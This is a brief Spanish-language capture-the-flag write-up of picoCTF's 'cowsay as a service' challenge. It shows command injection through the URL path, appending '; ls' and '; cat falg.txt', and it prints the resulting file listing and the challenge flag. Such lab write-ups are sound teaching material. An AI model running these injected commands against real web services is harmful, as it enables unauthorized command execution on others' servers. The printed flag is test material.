## Objetivo 
Now presenting [cowsay as a service](https://caas.mars.picoctf.net)

## Solución  


- Al entrar a la pagina te indica que entres al siguiente url:
https://caas.mars.picoctf.net/cowsay/{message}




cuando entramos al link, nos da lo siguiente:
```java
 _________
< message >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

colocamos en el link un texto cualquiera y le colocamos un punto y coma el comando ls:

```shell
https://caas.mars.picoctf.net/cowsay/picoCTF; ls
```

al dar enter, nos da un listado de los archivos que contiene la pagina

```java
 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

```

- hacemos un cat al flag.txt

```java
https://caas.mars.picoctf.net/cowsay/picoCTF;%20cat%20falg.txt

 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```


## Notas Adicionales 

### Referencias
